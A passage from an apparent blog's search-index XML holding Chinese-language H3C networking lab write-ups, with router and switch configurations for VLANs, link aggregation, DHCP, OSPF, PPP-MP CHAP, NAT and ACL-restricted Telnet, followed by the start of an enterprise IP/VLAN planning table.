ip source 192.168.10.1 0.0.0.0 destination 19.0.200.2 0.0.0.0</span><br><span class="line">[R2-acl-ipv4-adv-3000]no rule 0</span><br><span class="line">[R2-acl-ipv4-adv-3000]rule 0 deny ip source 192.168.20.1 0.0.0.0 destination 19.0.100.6 0.0.0.0</span><br><span class="line">[R2-acl-ipv4-adv-3000]rule 1 deny 23 source 10.19.0.1 0.0.0.0 destination 19.0.200.2 0.0.0.0</span><br><span class="line">[R2-acl-ipv4-adv-3000]qu</span><br><span class="line">[R2]int s1/0</span><br><span class="line">[R2-Serial1/0]packet-filter 3000 inbound</span><br><span class="line">[R2-Serial1/0]qu</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实验01</title>
      <link href="/posts/62626"/>
      <url>/posts/62626</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/H3CNE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/01.jpg"></p><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>i</strong>.按照图示配置 IP 地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">SW1:</span><br><span class="line">interface LoopBack0</span><br><span class="line"> ip address 11.11.11.11 255.255.255.255</span><br><span class="line">interface Vlan-interface10</span><br><span class="line"> ip address 192.168.1.252 255.255.255.0</span><br><span class="line">interface Vlan-interface20</span><br><span class="line"> ip address 192.168.2.252 255.255.255.0</span><br><span class="line">interface Vlan-interface30</span><br><span class="line"> ip address 10.1.2.1 255.255.255.252</span><br><span class="line">interface Vlan-interface111</span><br><span class="line"> ip address 10.0.0.6 255.255.255.252</span><br><span class="line">SW2:</span><br><span class="line">interface LoopBack0</span><br><span class="line"> ip address 12.12.12.12 255.255.255.255</span><br><span class="line">interface Vlan-interface10</span><br><span class="line"> ip address 192.168.1.253 255.255.255.0</span><br><span class="line">interface Vlan-interface20</span><br><span class="line"> ip address 192.168.2.253 255.255.255.0</span><br><span class="line">interface Vlan-interface30</span><br><span class="line"> ip address 10.1.2.2 255.255.255.252             </span><br><span class="line">interface Vlan-interface222</span><br><span class="line"> ip address 10.0.0.10 255.255.255.252</span><br><span class="line">R1：</span><br><span class="line">interface MP-group1</span><br><span class="line"> ip address 202.100.1.2 255.255.255.252</span><br><span class="line">interface LoopBack0</span><br><span class="line"> ip address 1.1.1.1 255.255.255.255</span><br><span class="line">interface GigabitEthernet0/0</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.5 255.255.255.252</span><br><span class="line">interface GigabitEthernet0/1</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.1 255.255.255.252</span><br><span class="line">interface GigabitEthernet0/2</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.14 255.255.255.252</span><br><span class="line">R2：</span><br><span class="line">interface LoopBack0</span><br><span class="line"> ip address 2.2.2.2 255.255.255.255</span><br><span class="line">interface GigabitEthernet0/0</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.9 255.255.255.252</span><br><span class="line">interface GigabitEthernet0/1</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.18 255.255.255.252</span><br><span class="line">interface GigabitEthernet0/2</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.2 255.255.255.252</span><br><span class="line">R3：</span><br><span class="line">interface LoopBack0</span><br><span class="line"> ip address 3.3.3.3 255.255.255.255             </span><br><span class="line">interface GigabitEthernet0/0</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.13 255.255.255.252             </span><br><span class="line">interface GigabitEthernet0/1</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 10.0.0.17 255.255.255.252             </span><br><span class="line">interface GigabitEthernet0/2</span><br><span class="line"> port link-mode route</span><br><span class="line"> combo enable copper</span><br><span class="line"> ip address 192.168.3.254 255.255.255.0</span><br><span class="line">Telnet:</span><br><span class="line">[Telnet]int mp 1</span><br><span class="line">[Telnet-MP-group1]ip add 202.100.1.1 30</span><br><span class="line">[Telnet-MP-group1]int l0</span><br><span class="line">[Telnet-LoopBack0]ip add 100.1.1.1 32#模拟互联网</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ii</strong>.SW1 和 SW2 之间的直连链路配置链路聚合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1-vlan10]vlan 20</span><br><span class="line">[SW1]interface Bridge-Aggregation 1</span><br><span class="line">[SW1-Bridge-Aggregation1]int g 1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port link-aggregation group 1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]int g 1/0/2</span><br><span class="line">[SW1-GigabitEthernet1/0/2]port link-aggregation group 1</span><br><span class="line"></span><br><span class="line">[SW2-GigabitEthernet1/0/2]vlan 10 </span><br><span class="line">[SW2-vlan10]vlan 20</span><br><span class="line">[SW2]int Bridge-Aggregation 1</span><br><span class="line">[SW2-Bridge-Aggregation1]int g 1/0/1</span><br><span class="line">[SW2-GigabitEthernet1/0/1]port link-aggregation group 1</span><br><span class="line">[SW2-GigabitEthernet1/0/1]int g 1/0/2</span><br><span class="line">[SW2-GigabitEthernet1/0/2]port link-aggregation group 1</span><br></pre></td></tr></table></figure><p><strong>iii</strong>.公司内部业务网段为 Vlan10 和 Vlan20；Vlan10 是市场部，Vlan20 是技术部，要求对 Vlan 进行命名以便识别；PC1 属于 Vlan10，PC2 属于 Vlan20，Vlan30 用于 SW1 和 SW2 建立 OSPF 邻居；Vlan111 为 SW1 和 R1 的互联 Vlan，Vlan222 为 SW2 和 R2 的互联 Vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[SW3-vlan20]dis vlan 10</span><br><span class="line"> VLAN ID: 10</span><br><span class="line"> VLAN type: Static</span><br><span class="line"> Route interface: Not configured</span><br><span class="line"> Description: VLAN 0010</span><br><span class="line"> Name: 市场部</span><br><span class="line"> Tagged ports:   </span><br><span class="line">    GigabitEthernet1/0/1          GigabitEthernet1/0/2          </span><br><span class="line"> Untagged ports: </span><br><span class="line">    GigabitEthernet1/0/3          </span><br><span class="line"></span><br><span class="line">[SW3-vlan20]dis vlan 20</span><br><span class="line"> VLAN ID: 20</span><br><span class="line"> VLAN type: Static</span><br><span class="line"> Route interface: Not configured</span><br><span class="line"> Description: VLAN 0020</span><br><span class="line"> Name: VLAN 0020</span><br><span class="line"> Tagged ports:   </span><br><span class="line">    GigabitEthernet1/0/1          GigabitEthernet1/0/2          </span><br><span class="line"> Untagged ports: </span><br><span class="line">    GigabitEthernet1/0/4          </span><br><span class="line"></span><br><span class="line">[SW1]vlan 30</span><br><span class="line">[SW1-vlan30]vlan 111</span><br><span class="line">[SW1-vlan111]port g 1/0/4</span><br><span class="line">[SW1-vlan111]</span><br><span class="line">[SW2-Vlan-interface30]vlan 30</span><br><span class="line">[SW2-vlan30]vlan 222</span><br><span class="line">[SW2-vlan222]port g 1/0/4</span><br><span class="line">[SW2-vlan222]</span><br></pre></td></tr></table></figure><p><strong>iv</strong>.所有交换机相连的端口配置为 Trunk，允许相关流量通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[SW3]int g 1/0/1</span><br><span class="line">[SW3-GigabitEthernet1/0/1]port link-type trunk</span><br><span class="line">[SW3-GigabitEthernet1/0/1]port trunk per vlan 10 20</span><br><span class="line">[SW3-GigabitEthernet1/0/1]int g 1/0/2</span><br><span class="line">[SW3-GigabitEthernet1/0/2]port link-type trunk</span><br><span class="line">[SW3-GigabitEthernet1/0/2]port tr per vlan 10 20</span><br><span class="line"></span><br><span class="line">[SW1]int Bridge-Aggregation 1</span><br><span class="line">[SW1-Bridge-Aggregation1]port link-type trunk</span><br><span class="line">[SW1-Bridge-Aggregation1]port trunk per vlan 10 20 30   #vlan30用于SW1、SW2建立OSPF邻居</span><br><span class="line">[SW1-Bridge-Aggregation1]int g 1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[SW1-GigabitEthernet1/0/3]port trunk per vlan 10 20</span><br><span class="line"></span><br><span class="line">[SW2-vlan20]int b 1</span><br><span class="line">[SW2-Bridge-Aggregation1]port link-type trunk </span><br><span class="line">[SW2-Bridge-Aggregation1]port trunk per vlan 10 20 30</span><br><span class="line">[SW2]int g 1/0/3</span><br><span class="line">[SW2-GigabitEthernet1/0/3]port link-type trunk</span><br><span class="line">[SW2-GigabitEthernet1/0/3]port trunk per vlan 10 20</span><br></pre></td></tr></table></figure><p><strong>v</strong>.交换机连接 PC 的端口配置为边缘端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW3-vlan20]int g 1/0/3</span><br><span class="line">[SW3-GigabitEthernet1/0/3]stp edged-port </span><br><span class="line">[SW3-GigabitEthernet1/0/3]int g 1/0/4</span><br><span class="line">[SW3-GigabitEthernet1/0/4]stp edged-port</span><br></pre></td></tr></table></figure><p><strong>vi</strong>.在 SW1 上配置 DHCP 服务，为 Vlan10 和 Vlan20 的 PC 动态分配 IP 地址、网关和 DNS 地址；要求 Vlan10 的网关是 <code>192.168.1.252</code>，Vlan20 的网关是 <code>192.168.2.253</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Sw1]dhcp en</span><br><span class="line">[Sw1]dhcp server ip-pool 1</span><br><span class="line">[Sw1-dhcp-pool-1]net 192.168.1.0 mask 255.255.255.0</span><br><span class="line">[Sw1-dhcp-pool-1]gateway-list 192.168.1.252</span><br><span class="line">[Sw1-dhcp-pool-1]dns-list 8.8.8.8</span><br><span class="line">[Sw1-dhcp-pool-1]qu</span><br><span class="line">[Sw1]dhcp server ip-pool 2</span><br><span class="line">[Sw1-dhcp-pool-2]net 192.168.2.0 mask 255.255.255.0</span><br><span class="line">[Sw1-dhcp-pool-2]gateway-list 192.168.2.253</span><br><span class="line">[Sw1-dhcp-pool-2]dns-list 8.8.8.8</span><br></pre></td></tr></table></figure><p><strong>vii</strong>.按图示分区域配置 OSPF 实现公司内部网络全网互通，ABR 的环回口宣告进骨干区域；业务网段不允许出现协议报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">[SW1]ospf router-id 11.11.11.11</span><br><span class="line">[SW1-ospf-1]area 1</span><br><span class="line">[SW1-ospf-1-area-0.0.0.1]net 11.11.11.11 0.0.0.0</span><br><span class="line">[SW1-ospf-1-area-0.0.0.1]network 192.168.1.252 0.0.0.0</span><br><span class="line">[SW1-ospf-1-area-0.0.0.1]network 192.168.2.252 0.0.0.0</span><br><span class="line">[SW1-ospf-1-area-0.0.0.1]network 10.1.2.1 0.0.0.0</span><br><span class="line">[SW1-ospf-1-area-0.0.0.1]network 10.0.0.6 0.0.0.0</span><br><span class="line">SW2:</span><br><span class="line">[SW2]ospf router-id 12.12.12.12</span><br><span class="line">[SW2-ospf-1]area 1</span><br><span class="line">[SW2-ospf-1-area-0.0.0.1]dis this</span><br><span class="line"> area 0.0.0.1</span><br><span class="line">  network 10.0.0.10 0.0.0.0</span><br><span class="line">  network 10.1.2.2 0.0.0.0</span><br><span class="line">  network 12.12.12.12 0.0.0.0</span><br><span class="line">  network 192.168.1.253 0.0.0.0</span><br><span class="line">  network 192.168.2.253 0.0.0.0</span><br><span class="line"> </span><br><span class="line">R1:</span><br><span class="line">[R1]ospf router-id 1.1.1.1 </span><br><span class="line">[R1-ospf-1]area 0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 1.1.1.1 0.0.0.0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 10.0.0.1 0.0.0.0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]network 10.0.0.14 0.0.0.0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]area 1</span><br><span class="line">[R1-ospf-1-area-0.0.0.1]network 10.0.0.5 0.0.0.0</span><br><span class="line">R2:</span><br><span class="line">[R2]ospf router-id 2.2.2.2</span><br><span class="line">[R2-ospf-1]area 0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 10.0.0.18 0.0.0.0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 2.2.2.2 0.0.0.0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]network 10.0.0.2 0.0.0.0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]area 1</span><br><span class="line">[R2-ospf-1-area-0.0.0.1]network 10.0.0.9 0.0.0.0</span><br><span class="line">R3:</span><br><span class="line">[R3]ospf router-id 3.3.3.3</span><br><span class="line">[R3-ospf-1]area 0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 3.3.3.3 0.0.0.0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 10.0.0.13 0.0.0.0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]network 10.0.0.17 0.0.0.0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]net 192.168.3.254 0.0.0.0</span><br><span class="line"></span><br><span class="line">业务网段不允许出现协议报文:</span><br><span class="line">[SW1]ospf 1</span><br><span class="line">[SW1-ospf-1]silent-interface Vlan-interface10</span><br><span class="line">[SW1-ospf-1]silent-interface Vlan-interface20</span><br></pre></td></tr></table></figure><p><strong>viii</strong>.R1 上配置默认路由指向互联网，并引入到 OSPF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0  0 202.100.1.1</span><br><span class="line">[R1-ospf-1]default-route-advertise#把默认路由引入到ospf传递邻居学习</span><br></pre></td></tr></table></figure><p><strong>ix</strong>.R1 通过双线连接到互联网，配置 PPP-MP，并配置双向 chap 验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R1、Internet:</span><br><span class="line">[R1]int mp 1</span><br><span class="line">[R1-MP-group1]int s 1/0</span><br><span class="line">[R1-Serial1/0]ppp mp mp 1</span><br><span class="line">[R1-Serial2/0]ppp mp mp 1</span><br><span class="line">[R1]local-user zhangdaye class network</span><br><span class="line">New local user added.</span><br><span class="line">[R1-luser-network-zhangdaye]pass sim Qwer123456.</span><br><span class="line">[R1-luser-network-zhangdaye]ser ppp</span><br><span class="line">[R1-luser-network-zhangdaye]int s1/0</span><br><span class="line">[R1-Serial1/0]ppp authentication-mode chap</span><br><span class="line">[R1-Serial1/0]ppp chap user zhangdaye</span><br><span class="line">[R1-Serial1/0]int s 2/0</span><br><span class="line">[R1-Serial2/0]ppp authentication-mode chap</span><br><span class="line">[R1-Serial2/0]ppp chap user zhangdaye</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>x</strong>.配置 EASY IP，只有业务网段 <code>192.168.1.0/24</code> 和 <code>192.168.2.0/24</code> 的数据流可以通过 R1 访问互联网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]acl basic 2000</span><br><span class="line">[R1-acl-ipv4-basic-2000]rule per source 192.168.1.0 0.0.0.255</span><br><span class="line">[R1-acl-ipv4-basic-2000]rule per source 192.168.2.0 0.0.0.255</span><br><span class="line">[R1-acl-ipv4-basic-2000]int mp1</span><br><span class="line">[R1-MP-group1]nat outbound 2000</span><br></pre></td></tr></table></figure><p><strong>xi</strong>.R1 开启 TELNET 远程管理，使用用户 <code>abc</code> 登录，密码 <code>abc</code>，只允许技术部远程管理 R1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[R1]telnet ser en</span><br><span class="line">[R1]local-user abc </span><br><span class="line">New local user added.</span><br><span class="line">[R1-luser-manage-abc]pass sim abc</span><br><span class="line">[R1-luser-manage-abc]pass sim 123456789.</span><br><span class="line">[R1-luser-manage-abc]ser telnet</span><br><span class="line">[R1-luser-manage-abc]authorization-attribute user-role level-15</span><br><span class="line">[R1-luser-manage-abc]qu</span><br><span class="line">[R1]user-int vty 0 4</span><br><span class="line">[R1-line-vty0-4]authentication-mode scheme</span><br><span class="line">[R1-line-vty0-4]qu</span><br><span class="line">[R1-acl-ipv4-basic-2000]acl b 2001</span><br><span class="line">[R1-acl-ipv4-basic-2001]rule per source 192.168.2.0 0.0.0.255</span><br><span class="line">[R1-acl-ipv4-basic-2001]telnet server acl 2001</span><br></pre></td></tr></table></figure><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H3CNE中小型企业网络结构部署</title>
      <link href="/posts/16848"/>
      <url>/posts/16848</url>
      
        <content type="html"><![CDATA[<br /><p style="text-align:center;color:red;font-size:3em;font-weight: bold;">中小型企业网络架构<h3 id="项目拓扑"><a href="#项目拓扑" class="headerlink" title="项目拓扑"></a>项目拓扑</h3><p><img src="/images/H3CNE%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84%E9%83%A8%E7%BD%B2/01.jpg"></p><h3 id="项目设计"><a href="#项目设计" class="headerlink" title="项目设计"></a>项目设计</h3><p>1.<strong>网络连接规划</strong></p><p>i.RUNTIME 公司需要进行信息化建设，要求内部所有员工的办公设备连网，并且能够访问互联网</p><p>ii.公司网络架构按照三层模型设计</p><p>iii.接入层采用二层交换机，通过划分 VLAN 来隔离各个业务部门</p><p>iv.汇聚层采用两台三层交换机，作为所有业务网段的网关</p><p>v.核心层采用三台路由器，连接公司业务网段和内部服务器群，并接入到互联网</p><p>2.<strong>IP 地址及 VLAN 规划</strong></p><p>i.公司有5个业务部门，分别为市场部、销售部、技术部、财务部、HR，划分到不同 VLAN 进行隔离</p><p>ii.业务部门和服务器群主机数量较多，网段划分为 <code>192.168.X.X/24</code> 的 C 类网段</p><p>iii.设备之间的互联网段为了节省 IP 地址，划分为 <code>10.X.X.X/30</code> 的网段，每个网段 2 个 IP 地址</p><p>iv.在汇聚交换机上使用 DHCP 为终端设备自动分配 IP 地址，简化终端用户接入过程</p><p>v.IP 地址及 VLAN 规划详细信息见下表</p><table><thead><tr><th align="center">位置</th><th align="center">设备</th><th align="center">接口</th><th align="center">IP地址</th><th align="center">VLAN ID</th><th align="center">VLAN NAME</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">市场部</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">192.168.1.0&#x2F;24</td><td align="center">10</td><td align="center">market</td><td align="center">&#x2F;</td></tr><tr><td align="center">销售部</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">192.168.2.0&#x2F;24</td><td align="center">20</td><td align="center">sales</td><td align="center">&#x2F;</td></tr><tr><td align="center">技术部</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">192.168.3.0&#x2F;24</td><td align="center">30</td><td align="center">tech</td><td align="center">&#x2F;</td></tr><tr><td align="center">财务部</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">192.168.4.0&#x2F;24</td><td align="center">40</td><td align="center">account</td><td align="center">&#x2F;</td></tr><tr><td align="center">HR</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">192.168.5.0&#x2F;24</td><td align="center">50</td><td align="center">hr</td><td align="center">&#x2F;</td></tr><tr><td align="center">服务器区</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">192.168.6.0&#x2F;24</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif10</td><td align="center">192.168.1.252&#x2F;24</td><td align="center">10</td><td align="center">market</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif20</td><td align="center">192.168.2.252&#x2F;24</td><td align="center">20</td><td align="center">sales</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif30</td><td align="center">192.168.3.252&#x2F;24</td><td align="center">30</td><td align="center">tech</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif40</td><td align="center">192.168.4.252&#x2F;24</td><td align="center">40</td><td align="center">account</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif50</td><td align="center">192.168.5.252&#x2F;24</td><td align="center">50</td><td align="center">hr</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif60</td><td align="center">10.1.0.1&#x2F;30</td><td align="center">60</td><td align="center">huiju</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">vlanif111</td><td align="center">10.0.0.6&#x2F;30</td><td align="center">111</td><td align="center">hulian1</td><td align="center">连接 R1</td></tr><tr><td align="center">汇聚层</td><td align="center">SW1</td><td align="center">loopback0</td><td align="center">10.1.1.11&#x2F;32</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif10</td><td align="center">192.168.1.253&#x2F;24</td><td align="center">10</td><td align="center">market</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif20</td><td align="center">192.168.2.253&#x2F;20</td><td align="center">20</td><td align="center">sales</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif30</td><td align="center">192.168.3.253&#x2F;24</td><td align="center">30</td><td align="center">tech</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif40</td><td align="center">192.168.4.253&#x2F;24</td><td align="center">40</td><td align="center">account</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif50</td><td align="center">192.168.5.253&#x2F;24</td><td align="center">50</td><td align="center">hr</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif60</td><td align="center">10.1.0.2&#x2F;30</td><td align="center">60</td><td align="center">huiju</td><td align="center">&#x2F;</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">vlanif222</td><td align="center">10.0.0.10&#x2F;30</td><td align="center">222</td><td align="center">hulian2</td><td align="center">连接 R2</td></tr><tr><td align="center">汇聚层</td><td align="center">SW2</td><td align="center">loopback0</td><td align="center">10.1.1.12&#x2F;32</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td></tr><tr><td align="center">核心层</td><td align="center">R1</td><td align="center">G0&#x2F;0</td><td align="center">10.0.0.5&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 SW1</td></tr><tr><td align="center">核心层</td><td align="center">R1</td><td align="center">G0&#x2F;1</td><td align="center">10.0.0.1&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 R2</td></tr><tr><td align="center">核心层</td><td align="center">R1</td><td align="center">G0&#x2F;2</td><td align="center">10.0.0.14&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接 R3</td></tr><tr><td align="center">核心层</td><td align="center">R1</td><td align="center">MP1</td><td align="center">202.100.1.2&#x2F;30</td><td align="center">&#x2F;</td><td align="center">&#x2F;</td><td align="center">连接互联网</td></tr><tr><td align="center">核心层</td><td align="center">R1</td><td align="center">loopback0</td><td align="center">10.1.1.1&#x2F;32</td><td align="center">&#x2F;</td><td 